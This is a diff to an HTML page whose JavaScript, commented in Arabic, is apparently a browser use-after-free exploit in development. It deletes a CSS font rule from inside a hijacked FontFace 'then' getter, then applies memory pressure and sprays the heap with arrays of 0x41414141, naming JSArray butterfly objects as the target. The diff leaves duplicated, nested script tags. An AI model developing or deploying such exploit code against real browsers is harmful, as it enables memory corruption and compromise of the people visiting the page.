@@ -8,25 +8,32 @@
     <div id="debug">System Ready...</div>
 
 <script>
-    let sprayed = [];
-    let styleElement = document.createElement('style');
-    document.head.appendChild(styleElement);
-    let sheet = styleElement.sheet;
+<script>
+    let spray = [];
+    let pressure = [];
 
-    function triggerUAF() {
+    // 1. الضغط الذاكري: استنزاف الذاكرة المتاحة
+    function createPressure() {
+        for (let i = 0; i < 5000; i++) {
+            pressure.push(new Array(64).fill(0x12345678));
+        }
+    }
+
+    function trigger() {
+        createPressure(); // ضغط الذاكرة
+        
         let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
         document.fonts.add(font);
 
         Object.defineProperty(FontFace.prototype, 'then', {
             get() {
-                // الحذف المباشر للـ Rule
+                // الحذف
                 document.getElementById('fontStyle').sheet.deleteRule(0);
                 
-                // Spray سريع جداً باستخدام CSSStyleDeclaration
-                // هذا النوع من الكائنات يشارك نفس IsoHeap الخاص بـ CSSFontFace
+                // 2. الـ Spray المكثف في الفراغ
                 for (let i = 0; i < 2000; i++) {
-                    sheet.insertRule('.a' + i + '{color:red}', 0);
-                    sprayed.push(sheet.cssRules[0].style);
+                    // استخدام JSArray (Butterfly target)
+                    spray.push(new Array(32).fill(0x41414141));
                 }
                 return undefined;
             }
@@ -34,7 +41,9 @@
         font.load();
     }
 
-    setTimeout(triggerUAF, 1000);
+    setTimeout(trigger, 1000);
+</script>
+
 </script>
 
 </body>
